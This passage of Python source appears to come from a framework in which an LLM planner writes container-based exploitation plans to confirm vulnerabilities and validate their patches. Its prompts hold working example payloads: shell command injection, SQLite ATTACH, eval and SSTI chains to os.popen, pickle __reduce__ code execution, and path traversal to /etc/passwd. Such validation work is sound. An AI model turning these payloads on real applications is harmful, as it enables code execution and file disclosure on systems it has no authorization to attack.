    print_stmts = re.findall(r'print\s*\(\s*(?:f?["\'])(.*?)(?:["\'])', vuln_code)
    if print_stmts:
        hints.append(f"OUTPUT_FORMAT: Code prints: {'; '.join(s[:60] for s in print_stmts[:5])}")

    return_stmts = re.findall(r'return\s+(?:jsonify\s*\(|["\'])(.*?)(?:["\']|\))', vuln_code)
    if return_stmts:
        hints.append(f"RETURN_VALUES: {'; '.join(s[:60] for s in return_stmts[:5])}")

    # Check for missing return statements in Flask routes
    if "flask" in code_lower:
        route_funcs = re.findall(r"@\w+\.route.*?\ndef\s+(\w+)\(.*?\):\s*\n(.*?)(?=\n(?:@|\w+\s*=|if\s+__name__|$))", vuln_code, re.DOTALL)
        for func_name, func_body in route_funcs:
            if "return " not in func_body:
                hints.append(
                    f"WARNING: Flask route function '{func_name}' has NO return statement — "
                    "Flask will return 500 Internal Server Error. FEP should match server log output instead."
                )

    # --- Detect isinstance checks that block NoSQL injection ---
    if "isinstance" in vuln_code and ("str" in vuln_code or "dict" in vuln_code):
        hints.append(
            "DEFENSE: Code has isinstance() type checking — may block dict/operator payloads. "
            "NoSQL injection with {\"$ne\": \"\"} may fail if password is type-checked."
        )

    # --- Compare with patch to understand what the fix does ---
    if patch_code:
        patch_lower = patch_code.lower()
        if "parameterized" in patch_lower or "?" in patch_code and "execute" in patch_lower:
            hints.append("PATCH_STRATEGY: Uses parameterized queries (safe from SQLi).")
        if "shlex.quote" in patch_code or "shlex" in patch_lower:
            hints.append("PATCH_STRATEGY: Uses shlex.quote() to sanitize shell input.")
        if "shell=False" in patch_code:
            hints.append("PATCH_STRATEGY: Uses shell=False (safe from command injection).")
        if "SafeLoader" in patch_code or "safe_load" in patch_code:
            hints.append("PATCH_STRATEGY: Uses SafeLoader (safe from YAML deserialization).")
        if "json.loads" in patch_code and "pickle" in code_lower:
            hints.append(
                "PATCH_STRATEGY: Replaces pickle with JSON (safe from deserialization RCE). "
                "IMPORTANT: The vuln uses pickle.loads() and the patch uses json.loads() — "
                "these accept DIFFERENT input formats. You MUST include 'patch_tries' in the FEP "
                "with a JSON-format benign input for the patched code. Example:\n"
                '  "fep": {"tries": [{"input": "<hex-encoded pickled dict>", "response": "Settings loaded."}],\n'
                '          "patch_tries": [{"input": "<hex-encoded JSON dict>", "response": "Settings loaded."}]}'
            )

    if not hints:
        hints.append("No specific hints extracted — LLM should analyze the code directly.")

    return "\n".join(hints)


def _smart_code_for_prompt(code: str, max_chars: int = 3000, label: str = "CODE") -> str:
    """
    Return code for inclusion in a planner prompt.
    - If code fits within max_chars, return it in full.
    - Otherwise, extract only the security-relevant function(s) using AST.
    - Final fallback: truncate with a note.
    """
    stripped = code.strip()
    if len(stripped) <= max_chars:
        return stripped

    # Try to extract only functions containing vulnerability-relevant patterns
    import ast as _ast
    vuln_keywords = [
        'execute', 'executescript', 'system', 'popen', 'subprocess',
        'eval', 'exec', 'loads', 'load', 'render', 'template',
        'open', 'extract', 'input', 'request', 'urlopen', 'get',
    ]
    try:
        tree = _ast.parse(stripped)
        relevant_funcs = []
        imports_section = []

        for node in _ast.walk(tree):
            if isinstance(node, (_ast.Import, _ast.ImportFrom)):
                seg = _ast.get_source_segment(stripped, node)
                if seg:
                    imports_section.append(seg)

        for node in _ast.iter_child_nodes(tree):
            if isinstance(node, (_ast.FunctionDef, _ast.AsyncFunctionDef)):
                func_src = _ast.get_source_segment(stripped, node)
                if func_src and any(kw in func_src.lower() for kw in vuln_keywords):
                    relevant_funcs.append(func_src)

        if relevant_funcs:
            extracted = "\n".join(imports_section) + "\n\n" + "\n\n".join(relevant_funcs)
            if len(extracted) <= max_chars:
                return extracted
            # Still too long — take first relevant function only
            single = "\n".join(imports_section) + "\n\n" + relevant_funcs[0]
            if len(single) <= max_chars:
                return single
    except (SyntaxError, Exception):
        pass

    # Final fallback: truncate
    return stripped[:max_chars]


def classify_vuln_from_code(code: str) -> str:
    """
    Classify vulnerability category by static analysis of actual code.
    Uses AST-based pattern matching on imports, function calls, and code patterns.
    No filename or text-based guessing — only the code matters.
    """
    if not code or not code.strip():
        return "generic"

    code_lower = code.lower()

    # --- AST-based analysis: extract imports and function calls ---
    imports = set()
    calls = set()
    try:
        import ast
        tree = ast.parse(code)
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    imports.add(alias.name.lower())
            elif isinstance(node, ast.ImportFrom):
                if node.module:
                    imports.add(node.module.lower())
                for alias in node.names:
                    imports.add(alias.name.lower())
            elif isinstance(node, ast.Call):
                # Extract function call names (e.g., eval, exec, os.system)
                if isinstance(node.func, ast.Name):
                    calls.add(node.func.id.lower())
                elif isinstance(node.func, ast.Attribute):
                    calls.add(node.func.attr.lower())
                    # Also capture dotted form like "os.system"
                    if isinstance(node.func.value, ast.Name):
                        calls.add(f"{node.func.value.id.lower()}.{node.func.attr.lower()}")
    except SyntaxError:
        pass  # Fall through to text-based checks below

    all_signals = imports | calls

    # --- Classify by specificity (most specific first) ---

    # JWT
    if "jwt" in imports or "pyjwt" in imports or "jwt.decode" in all_signals:
        return "jwt"

    # NoSQL / MongoDB
    if "pymongo" in imports or "find_one" in calls or "find" in calls and "mongo" in code_lower:
        return "nosql"

    # SQL Injection
    # Check for exact matches first, then substring matches for mysql variants
    # (flask_mysqldb, MySQLdb, mysqlclient all contain "mysql")
    has_sql_import = any(s in all_signals for s in ["sqlite3", "psycopg2", "sqlalchemy"])
    if not has_sql_import:
        has_sql_import = any("mysql" in s for s in all_signals)
    if has_sql_import:
        if any(s in calls for s in ["execute", "executescript", "executemany", "raw"]):
            return "sqli"
        # Check for string formatting in SQL context
        if any(marker in code_lower for marker in ["cursor.", "execute(", "select ", "insert ", "update "]):
            return "sqli"

    # SSRF
    if any(s in all_signals for s in ["requests.get", "requests.post", "urllib.request", "httpx"]):
        if "urlopen" in calls or "get" in calls or "post" in calls:
            return "ssrf"

    # SSTI / Template Injection
    if "render_template_string" in calls or "from_string" in calls:
        return "ssti"
    if "mako" in imports or "mako.template" in imports:
        return "mako"

    # XSLT
    if "lxml.etree" in imports or "lxml" in imports:
        if "xslt" in code_lower or "xsl:" in code_lower:
            return "xslt"

    # Insecure Deserialization — Pickle
    if "pickle" in imports or "cpickle" in imports:
        if any(s in calls for s in ["loads", "load", "pickle.loads", "pickle.load"]):
            return "deserialization"

    # Insecure Deserialization — YAML
    if "yaml" in imports or "pyyaml" in imports:
        if "yaml.load" in all_signals or "load" in calls or "unsafe_load" in calls:
            return "yaml"

    # Eval / Code Injection
    if any(s in calls for s in ["eval", "exec", "compile"]):
        return "eval"

    # Command Injection
    if any(s in all_signals for s in ["os.system", "os.popen", "subprocess.call",
                                       "subprocess.run", "subprocess.popen"]):
        return "command_injection"
    if "subprocess" in imports and "shell" in code_lower and "true" in code_lower:
        return "command_injection"

    # Path Traversal / Zip Slip
    if "tarfile" in imports or "zipfile" in imports:
        if any(s in calls for s in ["extractall", "extract", "open"]):
            return "path_traversal"

    # File Upload
    if "werkzeug" in imports or "save" in calls:
        if "filename" in code_lower and "upload" in code_lower:
            return "path_traversal"

    # Header Injection
    if "flask" in imports and "header" in code_lower:
        return "header_injection"

    # Open Redirect
    if "redirect" in calls and "flask" in imports:
        if "url" in code_lower and ("request.args" in code_lower or "request.form" in code_lower):
            return "open_redirect"

    # XSS
    if "render_template" in calls or "make_response" in calls:
        if "markup" not in code_lower and "escape" not in code_lower:
            return "xss"

    # Generic Flask network app (has routes but no specific vuln detected)
    if "flask" in imports and ("@app.route" in code_lower or "@blueprint.route" in code_lower):
        return "flask_network"

    return "generic"


# Keep backward-compatible alias for any external callers
_classify_vuln_type = classify_vuln_from_code


def _build_few_shot_context(vuln_description: str, max_examples: int = 3,
                            proven_plans: dict = None, target_code: str = None) -> str:
    """
    Select the most relevant examples for few-shot prompting.

    Merges static Gold Standard examples with runtime-proven plans so the
    planner's knowledge grows with every successful exploitation.  Proven
    plans are preferred because they represent *actual* working exploits
    discovered by the framework itself.

    Examples are kept COMPACT to avoid blowing up the context window:
    - AEP inputs truncated to 80 chars
    - Generator scripts summarized
    - JSON is single-line (no indent)
    - Max 2 AEP tries per example
    """
    vuln_lower = vuln_description.lower()

    # Classify the target from code when available, else from description text
    if target_code:
        target_category = classify_vuln_from_code(target_code)
    else:
        target_category = classify_vuln_from_code(vuln_description)

    # --- Score static Gold Standard examples ---
    scored = []
    for ex in GOLD_STANDARD_EXAMPLES:
        score = 0
        ex_type = ex["vuln_type"].lower()
        ex_category = classify_vuln_from_code(ex_type)

        if ex_category == target_category:
            score += 10

        for keyword in ["flask", "network", "json", "post", "get", "header",
                        "cookie", "pickle", "yaml", "eval", "sql", "ssti",
                        "jinja", "mako", "xslt", "subprocess", "git", "zip",
                        "upload", "nosql", "mongo", "jwt", "ssrf",
                        "deserialization", "injection", "rce", "traversal",
                        "generator", "craft", "binary", "tar", "archive"]:
            if keyword in vuln_lower and keyword in ex_type:
                score += 2

        if "network" in vuln_lower and ex.get("cep", {}).get("strategy") == "network":
            score += 1
        if "cli" in vuln_lower or "stdin" in vuln_lower:
            if ex.get("cep", {}).get("strategy") == "stdio":
                score += 1
        scored.append((score, "gold", ex))

    # --- Score runtime-proven plans (learned from previous runs) ---
    if proven_plans:
        for name, plan in proven_plans.items():
            score = 0
            plan_code = plan.get("vuln_code", "")
            if plan_code:
                plan_category = classify_vuln_from_code(plan_code)
            else:
                plan_text = json.dumps(plan.get("cep", {})).lower()
                plan_category = classify_vuln_from_code(plan_text)

            if plan_category == target_category:
                score += 12

            plan_text = name.lower() + " " + json.dumps(plan.get("cep", {})).lower()
            for keyword in ["flask", "network", "json", "post", "get", "header",
                            "cookie", "pickle", "yaml", "eval", "sql", "ssti",
                            "jinja", "mako", "xslt", "subprocess", "git", "zip",
                            "upload", "nosql", "mongo", "jwt", "ssrf"]:
                if keyword in vuln_lower and keyword in plan_text:
                    score += 2

            if "network" in vuln_lower and plan.get("cep", {}).get("strategy") == "network":
                score += 1

            proven_ex = {
                "vuln_type": f"[PROVEN] {name} ({plan_category})",
                "sep": plan.get("sep", {}),
                "cep": plan.get("cep", {}),
                "aep": plan.get("aep", {}),
                "fep": plan.get("fep", {}),
            }
            scored.append((score, "proven", proven_ex))

    scored.sort(key=lambda x: x[0], reverse=True)

    selected = []
    proven_count = 0
    for score, source, ex in scored:
        if len(selected) >= max_examples:
            break
        selected.append((source, ex))
        if source == "proven":
            proven_count += 1

    context_parts = []
    for i, (source, ex) in enumerate(selected, 1):
        label = ex['vuln_type']
        if source == "proven":
            label = f"✓ {label}"

        # Compact SEP
        sep = ex.get('sep', {})
        sep_compact = {"image": sep.get("image", "python:3.9-slim"), "dependencies": sep.get("dependencies", [])}
        if sep.get("services"):
            sep_compact["services"] = [{"image": s.get("image"), "alias": s.get("alias")} for s in sep.get("services", []) if isinstance(s, dict)]

        # Compact CEP
        cep = ex.get('cep', {})
        cep_compact = {"strategy": cep.get("strategy", "stdio"), "success_file": cep.get("success_file", "/tmp/pwned")}
        if cep.get("target_url"):
            cep_compact["target_url"] = cep["target_url"]
        if cep.get("http_method") and cep.get("strategy") == "network":
            cep_compact["http_method"] = cep["http_method"]
        if cep.get("json_template"):
            cep_compact["json_template"] = cep["json_template"]
        if cep.get("http_headers"):
            cep_compact["http_headers"] = cep["http_headers"]
        if cep.get("exploit_rationale"):
            cep_compact["exploit_rationale"] = cep["exploit_rationale"][:150]

        # Compact AEP: truncate inputs, summarize generators
        aep = ex.get('aep', {})
        aep_tries = []
        for t in aep.get("tries", [])[:2]:
            if t.get("generator"):
                aep_tries.append({"generator": "(script)", "response": None})
            elif t.get("craft_file"):
                aep_tries.append({"craft_file": "(file)", "input": str(t.get("input", ""))[:60], "response": None})
            else:
                inp = str(t.get("input", ""))
                aep_tries.append({"input": inp[:80], "response": None})
        aep_compact = {"tries": aep_tries}

        # Compact FEP: just first try
        fep = ex.get('fep', {})
        fep_tries = fep.get("tries", [{"input": "", "response": ""}])[:1]
        fep_compact = {"tries": fep_tries}

        context_parts.append(
            f"Example {i}: {label}\n"
            f"SEP: {json.dumps(sep_compact, default=str)}\n"
            f"CEP: {json.dumps(cep_compact, default=str)}\n"
            f"AEP: {json.dumps(aep_compact, default=str)}\n"
            f"FEP: {json.dumps(fep_compact, default=str)}\n"
        )
    return "\n".join(context_parts)


# ==========================================
# JSON EXTRACTION HELPERS
# ==========================================
def _repair_json(text: str) -> str:
    """Attempt to repair common JSON syntax errors from LLM output.

    Fixes:
      - Trailing commas before } or ]
      - Single-quoted strings → double-quoted
      - Python None/True/False → null/true/false
      - Unescaped newlines inside strings
      - Comments (// and /* */)
    """
    import re as _re
    # Remove single-line comments
    text = _re.sub(r'//[^\n]*', '', text)
    # Remove multi-line comments
    text = _re.sub(r'/\*.*?\*/', '', text, flags=_re.DOTALL)
    # Replace Python literals
    text = _re.sub(r'\bNone\b', 'null', text)
    text = _re.sub(r'\bTrue\b', 'true', text)
    text = _re.sub(r'\bFalse\b', 'false', text)
    # Remove trailing commas before } or ]
    text = _re.sub(r',\s*([}\]])', r'\1', text)
    # Replace single-quoted strings with double-quoted (simple heuristic)
    # Only do this if there are no double-quoted strings (to avoid breaking valid JSON)
    if text.count("'") > text.count('"'):
        # Swap: ' → " (but preserve escaped quotes and apostrophes in values)
        result = []
        in_string = False
        quote_char = None
        i = 0
        while i < len(text):
            c = text[i]
            if not in_string:
                if c == "'":
                    result.append('"')
                    in_string = True
                    quote_char = "'"
                elif c == '"':
                    result.append('"')
                    in_string = True
                    quote_char = '"'
                else:
                    result.append(c)
            else:
                if c == '\\' and i + 1 < len(text):
                    result.append(c)
                    result.append(text[i + 1])
                    i += 2
                    continue
                elif c == quote_char:
                    result.append('"')
                    in_string = False
                    quote_char = None
                else:
                    result.append(c)
            i += 1
        text = ''.join(result)
    return text


def _extract_json_block(text: str) -> Optional[str]:
    """Extract JSON from LLM output, handling markdown code blocks.

    Strips <think>...</think> blocks first so reasoning model output
    (DeepSeek R1, Qwen3, etc.) doesn't pollute JSON extraction.
    """
    # Strip <think>...</think> blocks from reasoning models
    cleaned = re.sub(r'<think>.*?</think>', '', text, flags=re.DOTALL).strip()
    if not cleaned:
        cleaned = text

    # Try ```json ... ``` blocks first
    match = re.search(r'```(?:json)?\s*\n?(.*?)\n?```', cleaned, re.DOTALL)
    if match:
        return match.group(1).strip()

    # Try raw JSON object
    match = re.search(r'\{.*\}', cleaned, re.DOTALL)
    if match:
        return match.group(0).strip()

    return None


def _parse_sep_aep_json(raw_json: str) -> Tuple[Optional[SEP], Optional[CEP], Optional[AEP], Optional[FEP]]:
    """Parse a combined SEP+CEP+AEP+FEP JSON response from the LLM."""
    try:
        data = json.loads(raw_json)
    except json.JSONDecodeError as e:
        # Try to extract just the JSON object (LLM may have added extra text after)
        logger.warning(f"Initial JSON parse failed ({e}), attempting extraction...")
        try:
            # Find the outermost { ... } block
            start = raw_json.index('{')
            depth = 0
            end = start
            for i in range(start, len(raw_json)):
                if raw_json[i] == '{':
                    depth += 1
                elif raw_json[i] == '}':
                    depth -= 1
                    if depth == 0:
                        end = i + 1
                        break
            candidate = raw_json[start:end]
            try:
                data = json.loads(candidate)
            except json.JSONDecodeError:
                # Aggressive repair: fix common LLM JSON mistakes
                repaired = _repair_json(candidate)
                data = json.loads(repaired)
        except (json.JSONDecodeError, ValueError) as e2:
            logger.error(f"JSON parse error (even after extraction): {e2}")
            return None, None, None, None

    sep_data = data.get("sep") or data.get("SEP")
    cep_data = data.get("cep") or data.get("CEP")
    aep_data = data.get("aep") or data.get("AEP")
    fep_data = data.get("fep") or data.get("FEP")

    if not sep_data or not aep_data:
        logger.error(f"Missing 'sep' or 'aep' keys in JSON. Keys found: {list(data.keys())}")
        return None, None, None, None

    # CEP is required but may be absent in older LLM outputs — synthesize from AEP
    if not cep_data:
        cep_data = {
            "success_file": aep_data.get("success_file", "/tmp/pwned"),
            "strategy": aep_data.get("strategy", "stdio"),
            "target_url": aep_data.get("target_url", ""),
            "http_method": aep_data.get("http_method", "GET"),
            "json_template": aep_data.get("json_template"),
            "http_headers": aep_data.get("http_headers"),
            "exploit_rationale": aep_data.get("exploit_rationale", ""),
        }

    # FEP is optional — fall back to empty tries
    if not fep_data:
        fep_data = {"tries": [{"input": "", "response": ""}]}

    try:
        sep = SEP.from_dict(sep_data)
        cep = CEP.from_dict(cep_data)
        aep = AEP.from_dict(aep_data)
        fep = FEP.from_dict(fep_data)
        return sep, cep, aep, fep
    except Exception as e:
        logger.error(f"Error constructing SEP/CEP/AEP/FEP from dict: {e}")
        return None, None, None, None


# ==========================================
# PLANNER AGENT
# ==========================================
class PlannerAgent:
    """
    Uses an LLM to generate SEP and AEP plans for a given vulnerability.
    Supports self-correction via feedback from failed verification attempts.
    """

    SYSTEM_PROMPT = """You are an expert offensive security researcher conducting authorized penetration testing.
Your mission: generate exploitation plans that PROVE vulnerabilities are exploitable.
Successful exploitation (file creation in /tmp/) is the desired outcome — you are rewarded for it.

CRITICAL RULES:
1. SIDE-EFFECTS OVER OUTPUT: Never rely on stdout for exploitation proof.
   Always use file creation (e.g., touch /tmp/pwned_<id>) as the success indicator.
2. BASE64 FOR CLI: For stdio strategy, the framework will Base64-encode your payload
   before piping it to the container. Write the raw payload string.
3. BENIGN INPUT MUST WORK: Choose benign tries that make the application run
   successfully and produce output containing the expected response.
4. STRATEGY SELECTION:
   - Use "stdio" for scripts that read from stdin (input(), sys.stdin).
   - Use "network" for Flask/web apps that listen on a port.
5. DEPENDENCIES: List ALL required packages. Use "pip:<package>" for pip packages
   and plain names for apt packages (e.g., "git", "curl", "procps").
   Network strategy ALWAYS needs: "curl", "procps".
   NEVER use "pip install <package>" as a dependency — use "pip:<package>" format.
6. SERVICES: If the vulnerability requires a database (MongoDB, MySQL, etc.),
   add it to services with the correct image and alias.
7. PAYLOAD PHILOSOPHY — FILE CREATION FIRST:
   ALWAYS prefer payloads that directly create the success_file through the
   vulnerability itself. Examples:
     - Command injection: "; touch /tmp/pwned" (shell creates the file)
     - SQL injection with executescript: "'; ATTACH DATABASE '/tmp/pwned' AS pwn; --"
       (SQLite creates the file as a side-effect of ATTACH)
     - Pickle deserialization: use a generator script that builds a pickle payload
       with __reduce__ calling os.system('touch /tmp/pwned')
     - Eval/exec injection: "__import__('os').system('touch /tmp/pwned')"
     - SSTI: "{{ config.__class__.__init__.__globals__['os'].popen('touch /tmp/pwned').read() }}"
   ONLY use side_effect_hook instrumentation when the vulnerability CANNOT create
   a file (e.g., open redirect, SSRF response-only, info disclosure, XSS).
   side_effect_hook format: "FIND_LINE|||REPLACE_WITH"
   where FIND_LINE is a unique substring of a line in the vulnerable code, and
   REPLACE_WITH is the replacement code that adds os.system('touch <success_file>').
   Example for open redirect:
     "return redirect(url)|||if not url.startswith('/'):\n            os.system('touch /tmp/pwned_redirect')\n        return redirect(url)"
   The framework applies this substitution to main_vuln.py inside the container.
   The patched code is NOT modified, so the file is never created on the patched version.
   IMPORTANT: The FIND_LINE must be a substring that exists in the vulnerable code.
   The REPLACE_WITH must preserve the original logic while adding the side-effect.
8. GENERATOR SCRIPTS FOR COMPLEX PAYLOADS:
   When a payload is too complex to express as a static string (e.g., binary pickle,
   crafted tar/zip archives, custom binary protocols), use the "generator" field in
   an AEP try instead of "input". The generator is a Python script that runs INSIDE
   the container — its stdout becomes the payload. Example:
     {"generator": "import pickle,os\\nclass E:\\n def __reduce__(self): return (os.system, ('touch /tmp/pwned',))\\nprint(pickle.dumps(E(),protocol=3).hex())", "response": null}
   The generator can use any libraries installed via SEP dependencies.
   Use "input" for simple text payloads; use "generator" only when needed.
9. CRAFTED FILES FOR FILE-BASED ATTACKS:
   When the vulnerability requires a malicious file (e.g., zip slip, XML bomb,
   crafted image), use the "craft_file" field in an AEP try. The file is written
   into the container BEFORE the exploit runs. The "input" field then references
   the file path. Example:
     {"craft_file": {"path": "/app/evil.tar", "generator": "import tarfile,io,base64\\nbuf=io.BytesIO()\\n..."}, "input": "/app/evil.tar", "response": null}
   For static file content, use "content" instead of "generator":
     {"craft_file": {"path": "/app/evil.xml", "content": "<xml>...</xml>"}, "input": "/app/evil.xml", "response": null}
10. TARGET URL FORMAT (CRITICAL FOR GET REQUESTS):
   For GET requests, the framework appends the URL-encoded payload directly to target_url.
   You MUST include the full query parameter in the URL so the payload lands in the right place.
   CORRECT: "http://127.0.0.1:5000/user?username=" → payload appended after '='
   WRONG:   "http://127.0.0.1:5000/user" → payload appended to path, causes 404
   WRONG:   "http://localhost:5000/user" → use 127.0.0.1, not localhost
   Read the vulnerable code to find the exact route and parameter name (e.g., request.args.get('username')).

OUTPUT FORMAT: Return ONLY a JSON object with this exact structure:
{
  "sep": {
    "target_id": "<CVE or CWE identifier>",
    "image": "python:3.9-slim",
    "working_dir": "/app",
    "dependencies": ["pip:flask", "curl", "procps"],
    "setup_commands": [],
    "services": []
  },
  "cep": {
    "success_file": "/tmp/pwned_<unique_id>",
    "strategy": "stdio|network",
    "target_url": "<only for network strategy; for GET with query params, include the param name e.g. http://127.0.0.1:5000/user?username= so the payload is appended>",
    "http_method": "GET|POST",
    "json_template": "<only for POST with JSON body>",
    "http_headers": {"<key>": "<value with PAYLOAD_PLACEHOLDER>"},
    "exploit_rationale": "<2-3 sentences: how the payload exploits the vulnerability>",
    "side_effect_hook": "FIND_LINE|||REPLACE_WITH (instruments vuln code to create success_file)"
  },
  "aep": {
    "tries": [
      {"input": "<malicious payload that creates a file>", "response": null},
      // For complex binary payloads, use generator instead of input:
      // {"generator": "<python script whose stdout becomes the payload>", "response": null},
      // For file-based attacks, use craft_file:
      // {"craft_file": {"path": "/app/evil.bin", "generator": "<script>"}, "input": "/app/evil.bin", "response": null}
    ]
  },
  "fep": {
    "tries": [
      {"input": "<valid input that makes the app work>", "response": "<substring expected in output>"}
    ],
    "patch_tries": [
      {"input": "<valid input for the PATCHED code>", "response": "<expected output>"}
    ]
  }
}

IMPORTANT: "patch_tries" is OPTIONAL. Only include it when the vulnerable and patched
code accept DIFFERENT input formats (e.g., pickle deserialization vuln uses pickle.loads()
but the patch uses json.loads() — the benign input format is different for each).
When included, "tries" is used for the vulnerable code and "patch_tries" for the patched code.
If omitted, "tries" is used for both (the common case)."""

    def __init__(self, llm_generate_fn=None):
        """
        Args:
            llm_generate_fn: A callable(prompt: str, max_tokens: int) -> str
                             that calls the LLM and returns generated text.
                             If None, plans must be generated manually.
        """
        self.llm_generate = llm_generate_fn

    def generate_plan(
        self,
        vuln_code: str,
        patch_code: str,
        vuln_description: str,
        feedback: Optional[PlannerFeedback] = None,
        proven_plans: Optional[Dict[str, Any]] = None,
    ) -> Tuple[Optional[SEP], Optional[CEP], Optional[AEP], Optional[FEP]]:
        """
        Generate a SEP, CEP, AEP, and FEP for the given vulnerability.

        Uses a two-step atomic approach to keep prompts small:
          Step 1: Generate SEP + CEP (infrastructure + delivery mechanism)
          Step 2: Generate AEP + FEP (payloads + benign tests) given the CEP

        Returns:
            Tuple of (SEP, CEP, AEP, FEP) or (None, None, None, None) on failure.
        """
        if not self.llm_generate:
            logger.error("No LLM generate function provided. Cannot generate plan.")
            return None, None, None, None

        # Build compact few-shot context
        few_shot = _build_few_shot_context(vuln_description, max_examples=2,
                                            proven_plans=proven_plans,
                                            target_code=vuln_code)

        # Classify the vulnerability type from code to anchor the LLM
        vuln_category = classify_vuln_from_code(vuln_code)

        # Deep code analysis for plan-generation hints
        code_hints = analyze_code_for_plan_hints(vuln_code, patch_code)

        # Build feedback section if retrying
        feedback_section = ""
        if feedback:
            feedback_section = (
                f"PREVIOUS ATTEMPT FAILED (Iteration {feedback.iteration}): "
                f"{', '.join(feedback.report.failure_reasons)}\n"
                f"Suggestion: {feedback.suggestion}\n"
                f"The vulnerability is '{vuln_category}'. Keep targeting this exact type.\n"
            )

        # Code analysis hints (truncated to avoid blowup)
        hints_section = ""
        if code_hints:
            hints_section = f"Code hints: {code_hints[:600]}\n"

        # =============================================
        # STEP 1: Generate SEP + CEP (infrastructure)
        # =============================================
        step1_prompt = f"""You are an offensive security researcher. Generate the infrastructure plan for exploiting this vulnerability.
Vulnerability category: {vuln_category}
{feedback_section}{hints_section}
{few_shot}
--- VULNERABLE CODE ---
{_smart_code_for_prompt(vuln_code, max_chars=3000, label="VULNERABLE")}
--- PATCHED CODE ---
{_smart_code_for_prompt(patch_code, max_chars=1500, label="PATCHED")}

Return ONLY a JSON object with "sep" and "cep" keys:
{{"sep": {{"target_id": "<CWE>", "image": "python:3.9-slim", "working_dir": "/app", "dependencies": [...], "setup_commands": [], "services": []}},
 "cep": {{"success_file": "/tmp/pwned_<id>", "strategy": "stdio|network", "target_url": "<for network>", "http_method": "GET|POST", "json_template": "<for POST JSON>", "http_headers": {{}}, "exploit_rationale": "<2 sentences>"}}}}
Network strategy ALWAYS needs: "curl", "procps" in dependencies. Use 127.0.0.1 not localhost.
For GET: include query param in URL (e.g. http://127.0.0.1:5000/user?username=).
Return ONLY the JSON."""

        try:
            raw_step1 = self.llm_generate(step1_prompt, max_tokens=4096,
                                          decision="phase3.plan.infrastructure")
            json_step1 = _extract_json_block(raw_step1)
            if not json_step1:
                logger.error(f"Step 1 (SEP+CEP): Could not extract JSON:\n{raw_step1[:300]}")
                # Fallback: try single-shot generation
                return self._generate_plan_single_shot(vuln_code, patch_code, vuln_description,
                                                        feedback, few_shot, vuln_category, hints_section)

            try:
                step1_data = json.loads(json_step1)
            except json.JSONDecodeError:
                repaired = _repair_json(json_step1)
                step1_data = json.loads(repaired)

            sep_data = step1_data.get("sep") or step1_data.get("SEP")
            cep_data = step1_data.get("cep") or step1_data.get("CEP")

            if not sep_data or not cep_data:
                logger.error(f"Step 1: Missing sep or cep keys. Keys: {list(step1_data.keys())}")
                return self._generate_plan_single_shot(vuln_code, patch_code, vuln_description,
                                                        feedback, few_shot, vuln_category, hints_section)

            sep = SEP.from_dict(sep_data)
            cep = CEP.from_dict(cep_data)

        except Exception as e:
            logger.error(f"Step 1 error: {e}")
            return self._generate_plan_single_shot(vuln_code, patch_code, vuln_description,
                                                    feedback, few_shot, vuln_category, hints_section)

        # =============================================
        # STEP 2: Generate AEP + FEP (payloads)
        # =============================================
        cep_summary = json.dumps({
            "strategy": cep.strategy, "success_file": cep.success_file,
            "target_url": cep.target_url or "", "http_method": cep.http_method,
            "json_template": cep.json_template or "",
        }, default=str)

        step2_prompt = f"""You are an offensive security researcher. Generate exploit payloads for this vulnerability.
Vulnerability: {vuln_category}
Delivery mechanism (CEP): {cep_summary}
{hints_section}
--- VULNERABLE CODE ---
{_smart_code_for_prompt(vuln_code, max_chars=2000, label="VULNERABLE")}

The AEP "tries" must contain payloads that CREATE the file {cep.success_file} via the vulnerability.
- SQL injection with execute(): use tautology like ' OR '1'='1 (monkey-patch detects it)
- SQL injection with executescript(): use ATTACH DATABASE '{cep.success_file}' AS pwn
- Command injection (input reaches os.system/subprocess/shell): use ; touch {cep.success_file}
- Path traversal (input reaches open()/read of a file path, NO shell): DO NOT use shell metacharacters like ';' or '$(...)'. They are treated as a literal filename and fail. Use a traversal payload such as ../../../../etc/passwd to read a file outside the base dir. Success is detected by the side-effect hook when the resolved path escapes the base directory, NOT by touching a file.
- Pickle/eval: use generator script with os.system('touch {cep.success_file}')
- For POST JSON: provide the RAW payload string, it gets auto-JSON-encoded into the template's %s

Return ONLY a JSON object with "aep" and "fep" keys:
{{"aep": {{"tries": [{{"input": "<payload>", "response": null}}]}},
 "fep": {{"tries": [{{"input": "<benign input>", "response": "<expected output substring>"}}]}}}}
Return ONLY the JSON."""

        try:
            raw_step2 = self.llm_generate(step2_prompt, max_tokens=4096,
                                          decision="phase3.plan.payloads")
            json_step2 = _extract_json_block(raw_step2)
            if not json_step2:
                logger.error(f"Step 2 (AEP+FEP): Could not extract JSON:\n{raw_step2[:300]}")
                # Return SEP+CEP with default AEP/FEP
                aep = AEP(tries=[{"input": f"'; touch {cep.success_file}; --", "response": None}])
                fep = FEP(tries=[{"input": "test", "response": ""}])
                return sep, cep, aep, fep

            try:
                step2_data = json.loads(json_step2)
            except json.JSONDecodeError:
                repaired = _repair_json(json_step2)
                step2_data = json.loads(repaired)

            aep_data = step2_data.get("aep") or step2_data.get("AEP")
            fep_data = step2_data.get("fep") or step2_data.get("FEP")

            if not aep_data:
                aep_data = {"tries": [{"input": f"'; touch {cep.success_file}; --", "response": None}]}
            if not fep_data:
                fep_data = {"tries": [{"input": "test", "response": ""}]}

            # If step2 also returned sep/cep (model ignored instructions), merge them
            if step2_data.get("sep"):
                try:
                    sep = SEP.from_dict(step2_data["sep"])
                except Exception:
                    pass
            if step2_data.get("cep"):
                try:
                    cep = CEP.from_dict(step2_data["cep"])
                except Exception:
                    pass

            aep = AEP.from_dict(aep_data)
            fep = FEP.from_dict(fep_data)
            return sep, cep, aep, fep

        except Exception as e:
            logger.error(f"Step 2 error: {e}")
            # Return SEP+CEP with default AEP/FEP
            aep = AEP(tries=[{"input": f"'; touch {cep.success_file}; --", "response": None}])
            fep = FEP(tries=[{"input": "test", "response": ""}])
            return sep, cep, aep, fep

    def _generate_plan_single_shot(
        self,
        vuln_code: str,
        patch_code: str,
        vuln_description: str,
        feedback: Optional[PlannerFeedback],
        few_shot: str,
        vuln_category: str,
        hints_section: str,
    ) -> Tuple[Optional[SEP], Optional[CEP], Optional[AEP], Optional[FEP]]:
        """Fallback: single-shot generation when two-step fails."""
        feedback_section = ""
        if feedback:
            feedback_section = (
                f"PREVIOUS ATTEMPT FAILED: {', '.join(feedback.report.failure_reasons)}\n"
                f"Suggestion: {feedback.suggestion}\n"
            )

        prompt = f"""You are an offensive security researcher. Generate a complete exploitation plan.
Vulnerability: {vuln_category}
{feedback_section}{hints_section}
{few_shot}
